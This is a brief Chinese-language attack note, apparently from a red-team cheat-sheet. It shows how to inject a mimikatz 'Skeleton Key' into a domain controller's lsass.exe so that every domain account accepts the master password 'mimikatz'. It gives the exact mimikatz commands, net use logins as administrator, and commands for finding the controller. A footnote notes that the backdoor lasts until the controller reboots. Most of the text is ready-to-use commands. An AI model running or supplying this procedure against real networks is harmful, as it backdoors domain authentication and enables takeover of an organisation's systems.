**在域控中通过mimikatz注入万能密码（Skeleton Key[^1]）。**
```powershell
.\mimikatz.exe
privilege::debug     #申请调试权限
misc::skeleton       #注入 skeleton key

# 使用Skeleton Key 连接域中主机
net use \\WIN-45GI22DJERU\ipc$ "mimikatz" /user:Tho\administrator
net use \\WIN-45GI22DJERU.Tho.com\ipc$ "mimikatz" /user:Tho.com\administrator
```
然后其他主机就可以用万能密码进行连接操作了
域控主机名可以用`net time /domain`或`net user /domain`



[^1]: Skeleton-Key，也可以叫他万能密码，就是在域控制器执行mimikatz给域中所有用户添加一个mimikatz的默认密码，但是他也是注入到内存里面的，就是将Skeleton Key 注入域控(DC)的 lsass.exe进程中，所以重启就会失效，但是通常域控很长时间都不会重启的。